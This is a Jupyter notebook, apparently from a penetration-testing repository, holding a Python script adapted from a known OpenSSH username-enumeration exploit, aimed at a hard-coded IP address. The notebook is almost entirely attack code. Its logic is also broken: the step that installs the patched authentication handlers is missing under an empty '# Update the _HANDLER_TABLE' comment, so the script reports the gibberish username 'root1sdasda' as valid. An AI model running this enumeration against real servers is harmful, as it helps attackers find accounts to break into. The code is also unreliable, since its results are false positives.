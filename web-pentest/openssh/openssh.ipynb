{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Valid username\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "# 45210\n",
    "import argparse\n",
    "import logging\n",
    "import paramiko\n",
    "import socket\n",
    "import sys\n",
    "\n",
    "\n",
    "class InvalidUsername(Exception):\n",
    "    pass\n",
    "\n",
    "\n",
    "def add_boolean(*args, **kwargs):\n",
    "    pass\n",
    "\n",
    "\n",
    "# Access the class variable _HANDLER_TABLE instead of _handler_table\n",
    "old_service_accept = paramiko.auth_handler.AuthHandler.auth_none\n",
    "\n",
    "\n",
    "def service_accept(*args, **kwargs):\n",
    "    paramiko.message.Message.add_boolean = add_boolean\n",
    "    return old_service_accept(*args, **kwargs)\n",
    "\n",
    "\n",
    "def userauth_failure(*args, **kwargs):\n",
    "    raise InvalidUsername()\n",
    "\n",
    "\n",
    "# Update the _HANDLER_TABLE\n",
    "\n",
    "# Suppress Paramiko's logging if not needed\n",
    "logging.getLogger(\"paramiko.transport\").addHandler(logging.NullHandler())\n",
    "\n",
    "# Define your arguments here or use argparse for dynamic input\n",
    "args = {\n",
    "    \"hostname\": \"198.18.0.246\",\n",
    "    \"port\": 22,\n",
    "    \"username\": \"root1sdasda\",\n",
    "}\n",
    "\n",
    "# Alternatively, using argparse for dynamic input\n",
    "# Uncomment the following lines if you prefer using command-line arguments\n",
    "\n",
    "# arg_parser = argparse.ArgumentParser(description=\"SSH Username Validator\")\n",
    "# arg_parser.add_argument(\"hostname\", type=str, help=\"Target SSH server hostname or IP\")\n",
    "# arg_parser.add_argument(\"--port\", type=int, default=22, help=\"Target SSH server port\")\n",
    "# arg_parser.add_argument(\"username\", type=str, help=\"Username to validate\")\n",
    "# args = arg_parser.parse_args()\n",
    "\n",
    "sock = socket.socket()\n",
    "try:\n",
    "    sock.connect((args[\"hostname\"], args[\"port\"]))\n",
    "except socket.error:\n",
    "    print(\"[-] Failed to connect\")\n",
    "    sys.exit(1)\n",
    "\n",
    "transport = paramiko.transport.Transport(sock)\n",
    "try:\n",
    "    transport.start_client(timeout=10)\n",
    "except paramiko.ssh_exception.SSHException:\n",
    "    print(\"[-] Failed to negotiate SSH transport\")\n",
    "    sys.exit(2)\n",
    "\n",
    "try:\n",
    "    # Generate a temporary RSA key for authentication attempt\n",
    "    temp_key = paramiko.RSAKey.generate(2048)\n",
    "    transport.auth_publickey(args[\"username\"], temp_key)\n",
    "except InvalidUsername:\n",
    "    print(\"[*] Invalid username\")\n",
    "    sys.exit(3)\n",
    "except paramiko.ssh_exception.AuthenticationException:\n",
    "    print(\"[+] Valid username\")\n",
    "finally:\n",
    "    transport.close()\n",
    "    sock.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
